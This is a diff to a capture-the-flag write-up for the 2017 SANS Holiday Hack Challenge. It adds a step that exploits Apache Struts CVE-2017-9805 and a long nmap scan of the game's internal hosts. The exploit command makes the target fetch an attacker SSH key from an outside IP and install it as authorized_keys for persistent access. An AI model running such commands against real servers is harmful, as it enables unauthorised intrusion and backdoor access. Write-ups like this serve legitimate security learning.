@@ -259,7 +259,7 @@ We can use the following indicators to search any clues we're later provided wit
 | 35.185.84.51                         | IP        | DNS (dev)              |
 | 35.185.115.185                       | IP        | DNS (admin, mail, ewa) |
 | 35.190.163.207                       | IP        | DNS (docker2017)       |
-| 35.196.67.150pub                     | IP        | DNS (2017)             |
+| 35.196.67.150                        | IP        | DNS (2017)             |
 | 35.196.73.18                         | IP        | DNS (chat)             |
 | 35.196.239.128                       | IP        | DNS (intranet)         |
 | HK-47 (Star Wars Droid)              | Reference | nppd robots.txt        |
@@ -270,3 +270,228 @@ We can use the following indicators to search any clues we're later provided wit
 | Cindy Lou Who (2015 Hack)            | Reference | nppd /infractions      |
 | Dr. Who (2016 Hack)                  | Reference | nppd /infractions      |
 
+* Let the Hack Begin!
+** Gaining Access to L2S
+The SAN cert showed it the was the same as dev.northpolechristmastown.com.
+
+TODO: Justin - how did you figure out it was Struts?
+
+Used the Python tool in the SANS blog post:
+
+#+BEGIN_SRC sh
+python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'mkdir /home/alabaster_snowball/.ssh; cd /home/alabaster_snowball/.ssh; wget http://1.2.3.4/a.key -O authorized_keys; chmod 600 authorized_keys; chmod 700 .'
+#+END_SRC
+
+#+BEGIN_SRC sh
+ssh l2s | tee nmap.out
+#+END_SRC
+
+#+BEGIN_SRC 
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-15 02:26 UTC
+Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
+Host is up (0.00020s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp   open  http     nginx 1.10.3
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.10.3
+|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
+443/tcp  open  ssl/http nginx 1.10.3
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.10.3
+|_http-title: Toys List
+| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
+| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
+| Issuer: commonName=Let's Encrypt Authority X3/organizationName=Let's Encrypt/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-11-29T12:54:54
+| Not valid after:  2018-02-27T12:54:54
+| MD5:   90b5 5b73 6e21 e00f 0247 b22d a1ec f953
+|_SHA-1: c089 30bf cd61 3a55 ea8f f419 2542 b9b4 9823 8fb1
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg: 
+|_  http/1.1
+2222/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
+Host is up (0.00017s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp open  http    nginx 1.10.3
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.10.3
+|_http-title: Toys List
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
+Host is up (0.00021s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ac:cc:7c:b1:cb:56:0b:bc:cd:05:12:36:e7:24:ca (RSA)
+|_  256 9f:4e:9a:ee:dc:ef:f4:4b:6d:1b:03:58:bb:5d:a2:87 (ECDSA)
+25/tcp   open  smtp    Postfix smtpd
+|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+80/tcp   open  http    nginx 1.10.3 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/cookie.txt
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+143/tcp  open  imap    Dovecot imapd
+|_imap-capabilities: OK ID IDLE LITERAL+ AUTH=PLAIN more have capabilities listed post-login LOGIN-REFERRALS Pre-login AUTH=LOGINA0001 ENABLE SASL-IR IMAP4rev1
+2525/tcp open  smtp    Postfix smtpd
+|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+3000/tcp open  http    Node.js Express framework
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/cookie.txt
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
+Host is up (0.00017s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 33:fb:b7:35:b5:7a:72:6f:06:91:21:ff:e2:3e:86:79 (RSA)
+|_  256 70:71:ea:71:cd:83:d8:47:29:ef:6f:69:f3:8a:ed:a2 (ECDSA)
+80/tcp   open  http    nginx 1.10.3
+| http-methods: 
+|_  Supported Methods: HEAD OPTIONS GET
+| http-robots.txt: 1 disallowed entry 
+|_/dev
+|_http-server-header: nginx/1.10.3
+| http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_Requested resource was http://edb.northpolechristmastown.com/index.html
+389/tcp  open  ldap
+| fingerprint-strings: 
+|   LDAPBindReq: 
+|     Version 2 not supported
+|   LDAPSearchReq: 
+|     supportedLDAPVersion1
+|     namingContexts1
+|     dc=com0/
+|     supportedExtension1
+|_    1.3.6.1.4.1.4203.1.11.10
+8080/tcp open  http    Werkzeug httpd 0.12.2 (Python 2.7.13)
+| http-methods: 
+|_  Supported Methods: HEAD OPTIONS GET
+| http-robots.txt: 1 disallowed entry 
+|_/dev
+|_http-server-header: Werkzeug/0.12.2 Python/2.7.13
+|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port389-TCP:V=7.40%I=7%D=12/15%Time=5A3332D9%P=x86_64-pc-linux-gnu%r(LD
+SF:APSearchReq,83,"0s\x02\x01\x07dn\x04\x000j0\x1b\x04\x14supportedLDAPVer
+SF:sion1\x03\x04\x0130\x1a\x04\x0enamingContexts1\x08\x04\x06dc=com0/\x04\
+SF:x12supportedExtension1\x19\x04\x171\.3\.6\.1\.4\.1\.4203\.1\.11\.10\x0c
+SF:\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0")%r(LDAPBindReq,25,"0#\x02\x01\x0
+SF:1a\x1e\n\x01\x02\x04\0\x04\x17Version\x202\x20not\x20supported");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
+Host is up (0.00081s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3389/tcp open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hhc17-smb-server
+| Issuer: commonName=hhc17-smb-server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-11-06T13:46:55
+| Not valid after:  2018-05-08T13:46:55
+| MD5:   092f 018a 083a b87a 8186 ecac da4e 09e2
+|_SHA-1: 0a0d f4e6 765f 1818 cd32 4bf2 5212 e8ca ef51 5c38
+|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
+Host is up (0.00014s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp open  http    nginx 1.10.3
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.10.3
+|_http-title: Toys List
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
+Host is up (0.00089s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Index - North Pole Engineering Presents: EaaS!
+3389/tcp open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hhc17-elf-manufacturing
+| Issuer: commonName=hhc17-elf-manufacturing
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-11-23T20:53:55
+| Not valid after:  2018-05-25T20:53:55
+| MD5:   a711 f240 0c9e a8cd 3be4 81fa fa16 f15a
+|_SHA-1: 5728 6c5d 2ec0 6657 629b f9f4 72aa 0b3d 12d4 b3a5
+|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+NSE: Script Post-scanning.
+Initiating NSE at 02:27
+Completed NSE at 02:27, 0.00s elapsed
+Initiating NSE at 02:27
+Completed NSE at 02:27, 0.00s elapsed
+Post-scan script results:
+| clock-skew: 
+|   0s: 
+|     10.142.0.13 (eaas.northpolechristmastown.com)
+|_    10.142.0.8 (hhc17-emi.c.holidayhack2017.internal)
+| ssh-hostkey: Possible duplicate hosts
+| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
+|   10.142.0.2
+|   10.142.0.3
+|   10.142.0.11
+| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
+|   10.142.0.2
+|   10.142.0.3
+|_  10.142.0.11
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 256 IP addresses (7 hosts up) scanned in 86.82 seconds
+#+END_SRC
